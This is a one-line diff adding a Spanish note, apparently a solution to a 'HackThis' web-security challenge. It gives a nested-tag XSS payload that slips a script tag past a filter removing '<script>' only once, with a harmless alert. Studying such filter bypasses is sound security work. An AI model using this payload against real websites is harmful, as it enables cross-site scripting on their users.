@@ -1,0 +1,1 @@
+Se debe de hacer un bypass al <script> con <scr<script>ipt>alert('HackThis!!');</scr</script>ipt>.
